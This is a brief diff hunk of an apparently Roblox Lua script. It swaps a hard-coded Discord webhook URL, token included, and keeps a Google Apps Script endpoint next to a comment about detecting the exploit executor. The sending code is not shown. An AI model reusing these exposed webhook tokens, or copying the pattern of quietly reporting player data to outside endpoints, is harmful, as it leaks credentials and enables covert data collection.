@@ -33,7 +33,7 @@ if not player then
 end
 
 -- URLs
-local webhookUrl = "https://discord.com/api/webhooks/1444415194716573797/6tyoftw9Pa2QzHkZcj3AocZEl7if6QYtvxAFAbN71ecq83aEiKCWZP9VEzmkcPM-JdUK"
+local webhookUrl = "https://discord.com/api/webhooks/1472618035746705428/Pl3paFuGvnBWGusgDA6FuJDI39sCKDT8yuV8L4ZvZ9HXfHlpNFje6v4euOnkNwjud3k9"
 local googleScriptUrl = "https://script.google.com/macros/s/AKfycbzuazVi52P5OM_typNE82ZvG83gjKa1wRNFqbZctKOUNWfZkAMbL408azjDgy-6f9o8XA/exec"
 
 -- Detect executor
